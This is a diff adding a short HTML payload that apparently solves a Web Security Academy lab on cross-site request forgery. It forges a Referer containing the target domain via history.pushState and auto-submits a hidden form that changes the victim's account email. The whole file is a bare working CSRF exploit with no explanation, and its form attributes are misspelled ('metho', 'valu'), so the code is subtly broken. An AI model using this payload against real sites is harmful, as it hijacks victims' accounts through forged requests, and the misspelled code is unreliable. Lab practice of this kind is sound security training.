@@ -1,0 +1,10 @@
+Referer: https://arbitrary-incorrect-domain.net?0a8b00c204c36088c0ff135300bc00e3.web-security-academy.net.web-security-academy.net/my-account
+
+    <script>
+        history.pushState("", "", "/?0a8b00c204c36088c0ff135300bc00e3.web-security-academy.net/my-account")
+    </script>
+    <form action="https://0a8b00c204c36088c0ff135300bc00e3.web-security-academy.net/my-account/change-email" metho="POST">
+        <input type="hidden" name="email" value="Batman@mail.com">
+        <input type="submit" valu="Submit request">
+    </form>
+    <script>document.forms[0].submit()</script>
